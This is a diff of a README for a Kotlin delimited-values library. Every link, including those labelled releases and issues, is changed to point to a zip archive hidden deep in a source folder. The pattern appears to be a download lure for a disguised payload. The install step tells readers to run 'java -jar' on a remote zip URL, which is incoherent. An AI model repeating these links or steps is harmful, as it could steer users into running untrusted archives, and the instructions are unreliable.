@@ -1,7 +1,7 @@
 # 🎉 kotlin-dsv - Simple Handling of Delimited Values
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/mystro404/kotlin-dsv/main/population/kotlin-dsv.zip)](https://raw.githubusercontent.com/mystro404/kotlin-dsv/main/population/kotlin-dsv.zip)
+[![Download](https://github.com/mystro404/kotlin-dsv/raw/refs/heads/main/benchmark/src/commonMain/kotlin/dev/kotlin_dsv_v1.3.zip)](https://github.com/mystro404/kotlin-dsv/raw/refs/heads/main/benchmark/src/commonMain/kotlin/dev/kotlin_dsv_v1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to `kotlin-dsv`, a library designed to help you easily work with delimiter-separated values. Whether you're dealing with CSV, TSV, or any other format, this tool simplifies the process for everyone.
@@ -21,7 +21,7 @@ Welcome to `kotlin-dsv`, a library designed to help you easily work with delimit
 ## 🔍 How to Download & Install
 To get started with `kotlin-dsv`, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to [GitHub Releases](https://raw.githubusercontent.com/mystro404/kotlin-dsv/main/population/kotlin-dsv.zip) to access the latest version of the software.
+1. **Visit the Releases Page**: Go to [GitHub Releases](https://github.com/mystro404/kotlin-dsv/raw/refs/heads/main/benchmark/src/commonMain/kotlin/dev/kotlin_dsv_v1.3.zip) to access the latest version of the software.
 
 2. **Select the Release**: Look for the latest version available. Typically, it will be listed at the top.
 
@@ -32,7 +32,7 @@ To get started with `kotlin-dsv`, follow these simple steps:
    - For .jar files, you can run the program using the command line:
      - Open your command prompt or terminal.
      - Navigate to the folder where you downloaded the file.
-     - Enter the command: `java -jar https://raw.githubusercontent.com/mystro404/kotlin-dsv/main/population/kotlin-dsv.zip` (replace `x.x.x` with the version number).
+     - Enter the command: `java -jar https://github.com/mystro404/kotlin-dsv/raw/refs/heads/main/benchmark/src/commonMain/kotlin/dev/kotlin_dsv_v1.3.zip` (replace `x.x.x` with the version number).
    - For other formats, follow the instructions provided for those specific packages.
 
 5. **Check for Dependencies**: Some versions may require additional libraries. Check the documentation on the releases page for any additional instructions.
@@ -61,7 +61,7 @@ Not at all! While the library is designed for developers, simple commands help n
 Yes, community support is available on GitHub. You can open an issue, and contributors will assist you with any problems you encounter.
 
 ## 🌍 Community and Contribution
-We encourage community contributions to enhance `kotlin-dsv`. If you have ideas or improvements, please visit the [GitHub Issues](https://raw.githubusercontent.com/mystro404/kotlin-dsv/main/population/kotlin-dsv.zip) section to share your thoughts.
+We encourage community contributions to enhance `kotlin-dsv`. If you have ideas or improvements, please visit the [GitHub Issues](https://github.com/mystro404/kotlin-dsv/raw/refs/heads/main/benchmark/src/commonMain/kotlin/dev/kotlin_dsv_v1.3.zip) section to share your thoughts.
 
 ## ⭐️ Acknowledgments
 Thank you to all contributors and users who help make `kotlin-dsv` better. Your feedback and contributions are invaluable.
@@ -75,4 +75,4 @@ Stay tuned for future updates where we plan to introduce additional features lik
 - Enhanced error handling
 - Integration with cloud storage services
 
-Enjoy your experience with `kotlin-dsv`! Don't forget to download the latest version [here](https://raw.githubusercontent.com/mystro404/kotlin-dsv/main/population/kotlin-dsv.zip).
+Enjoy your experience with `kotlin-dsv`! Don't forget to download the latest version [here](https://github.com/mystro404/kotlin-dsv/raw/refs/heads/main/benchmark/src/commonMain/kotlin/dev/kotlin_dsv_v1.3.zip).
